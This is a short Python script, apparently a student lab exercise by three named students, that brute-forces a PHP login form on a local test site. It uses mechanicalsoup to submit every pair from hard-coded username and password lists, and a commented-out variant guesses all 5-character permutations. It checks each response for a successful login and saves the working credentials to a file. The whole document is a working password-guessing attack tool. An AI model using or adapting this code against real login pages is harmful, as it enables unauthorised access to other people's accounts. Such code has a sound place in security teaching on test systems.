# Maulida Meirisdiana   05311940000005
# Dida Prasetyo Rahmat  05311940000019
# Revina Rahmanisa H.   05311940000046

import mechanicalsoup
import itertools
# from numpy import loadtxt

browser = mechanicalsoup.StatefulBrowser()
username = ["user", "admin", "username"]
passwords = ["admin", "password", "jhgqiMKW4K3WQdH"]
# username = loadtxt('username.txt', dtype=str)
# passwords = loadtxt('password.txt', dtype=str)

# combinations = itertools.permutations("a-zA-Z0-9", 5)

i = 0
f = open("result.txt", "w")

# for username in username:
#     i = i + 1
    # j = 0
#     print("attempt - " + str(i))
#     for pwd in combinations:
#         browser.open("http://localhost/kap/login.php")
#         browser.select_form('form[action="login.php"]')
#         password = ''.join(pwd)
#         browser["username"] = username
#         browser["password"] = password
#         j = j + 1
#         print("\nTry - " + str(j))
#         print("user : " + username)
#         print("pass : " + password)
#         browser.submit_selected()
#         cek = browser.open("http://localhost/kap/index.php")
#         if "Login" not in cek.text:
#             f.write("username: " + username)
#             f.write("\n")
#             f.write("password: " + password)
#             f.write("\n")
#             browser.open("http://localhost/kap/logout.php")
#             break
# f.close()

for username in username:
    i = i + 1
    print("\n##### Attempt - " + str(i))
    j = 0
    for password in passwords:
        browser.open("http://localhost/kap/login.php")
        browser.select_form('form[action="login.php"]')
        browser["username"] = username
        browser["password"] = password
        j = j + 1
        print("\nTry - " + str(j))
        print("user : " + username)
        print("pass : " + password)
        browser.submit_selected()
        cek = browser.open("http://localhost/kap/index.php")
        if "Login" not in cek.text:
            f.write("username: " + username)
            f.write("\n")
            f.write("password: " + password)
            f.write("\n")
            f.write("\n")
            browser.open("http://localhost/kap/logout.php")
            break
f.close()
